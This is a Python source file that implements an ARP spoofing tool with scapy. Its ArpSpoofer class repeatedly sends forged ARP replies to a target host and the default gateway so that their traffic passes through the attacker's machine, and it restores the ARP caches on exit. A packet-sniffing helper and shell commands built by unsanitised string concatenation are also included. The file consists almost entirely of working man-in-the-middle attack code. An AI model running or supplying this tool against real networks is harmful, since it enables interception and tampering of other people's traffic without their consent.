import scapy.all as scapy
from cSubprocess import *
import time 

def sniff_packets():
    packets = scapy.sniff(filter='tcp', count=10)
    print(packets.show)

class ArpSpoofer:
    default_gateway_ip = None
    target_ethernet = None
    gateway_ethernet = None

    def __init__(self):
        pass

    def ping_address(self, ip_address):
        command = 'ping -c 1 ' + ip_address
        clean_subprocess(command, -1)

    def get_mac_address(self, ip_address):
        self.ping_address(ip_address)
        command = 'arp -a | grep ' + ip_address + ' | cut -d " " -f 4'
        target_mac = clean_subprocess(command, 0)
        return target_mac

    def get_default_gateway_ip(self):
        command = "netstat -rn | awk '/^0.0.0.0/ {print $2}'"
        self.default_gateway_ip = clean_subprocess(command, 0)
        return self.default_gateway_ip

    def rm_address_arp_cache(self, ip_address):
        command = 'arp -d ' + ip_address
        clean_subprocess(command, -1)

    def create_ether_packets(self, target_mac, gateway_mac):
        self.target_ethernet = scapy.Ether(dst=target_mac)
        self.gateway_ethernet = scapy.Ether(dst=gateway_mac)

    def spoof(self, gateway_ip, target_ip):
        try:
            while True:
                target_mac = self.get_mac_address(target_ip)
                gateway_mac = self.get_mac_address(gateway_ip)

                self.create_ether_packets(target_mac, gateway_mac)

                target_arp = scapy.ARP(op = 2, psrc=gateway_ip, pdst=target_ip , hwdst=target_mac)
                gateway_arp = scapy.ARP(op = 2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

                # Combine the Ethernet frame with the ARP packet
                target_packet = self.target_ethernet / target_arp
                gateway_packet = self.gateway_ethernet / gateway_arp

                # Send the packet
                print(target_packet.show())
                print(gateway_packet.show())

                scapy.sendp(target_packet, iface="eth0")
                scapy.sendp(gateway_packet, iface="eth0")

                time.sleep(2)
        except KeyboardInterrupt:
            print(" exiting arpspoof... cleaning up...")

            target_mac = self.get_mac_address(target_ip)
            gateway_mac = self.get_mac_address(gateway_ip)

            target_arp = scapy.ARP(op = 2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip , hwdst=target_mac)
            gateway_arp = scapy.ARP(op = 2, psrc=target_ip, hwsrc=target_mac , pdst=gateway_ip, hwdst=gateway_mac)

            # Combine the Ethernet frame with the ARP packet
            target_packet = self.target_ethernet / target_arp
            gateway_packet = self.gateway_ethernet / gateway_arp

            scapy.sendp(target_packet, iface="eth0")
            scapy.sendp(gateway_packet, iface="eth0")